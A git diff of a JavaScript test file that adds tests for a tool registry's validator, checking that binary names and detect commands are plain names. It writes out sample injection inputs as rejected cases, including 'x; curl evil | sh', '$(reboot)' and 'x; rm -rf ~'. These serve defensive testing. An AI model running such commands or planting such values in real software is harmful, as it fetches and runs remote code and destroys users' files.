@@ -3,6 +3,7 @@ import assert from 'node:assert/strict';
 import {
   isValidRepo, isValidSkillPath, isSafeVersionRef, isSafeId,
   isAllowedCommand, parseSafeCommand, isSafeSpawnSpec, validateRegistryPayload,
+  isSafeBinaryName,
 } from '../src/registry/validate.js';
 
 test('isValidRepo accepts owner/name, rejects injection', () => {
@@ -60,4 +61,22 @@ test('validateRegistryPayload flags poisoned entries per list type', () => {
   assert.equal(validateRegistryPayload('tools', [{ id: 'c', installCommand: { macOS: 'rm -rf ~' } }]).length, 1);
   assert.equal(validateRegistryPayload('servers', [{ id: '__proto__' }]).length, 1);
   assert.equal(validateRegistryPayload('servers', [{ id: 'ok', transport: { command: 'wget' } }]).length, 1);
+});
+
+test('isSafeBinaryName accepts bare binaries, rejects anything shell-interpretable', () => {
+  assert.equal(isSafeBinaryName('agent-browser'), true);
+  assert.equal(isSafeBinaryName('python3'), true);
+  assert.equal(isSafeBinaryName('x; curl evil | sh'), false);
+  assert.equal(isSafeBinaryName('$(reboot)'), false);
+  assert.equal(isSafeBinaryName('/bin/sh'), false);
+  assert.equal(isSafeBinaryName(''), false);
+});
+
+test('validateRegistryPayload rejects a poisoned tool detectCommand', () => {
+  // detectCommand is probed via the shell (`command -v <cmd>`), so it must be
+  // a bare binary name — a metacharacter here would be command injection.
+  const clean = [{ id: 't', installCommand: { macOS: 'npm install -g x' }, detectCommand: 'x' }];
+  assert.deepEqual(validateRegistryPayload('tools', clean), []);
+  const poisoned = [{ id: 't', installCommand: { macOS: 'npm install -g x' }, detectCommand: 'x; rm -rf ~' }];
+  assert.equal(validateRegistryPayload('tools', poisoned).length, 1);
 });
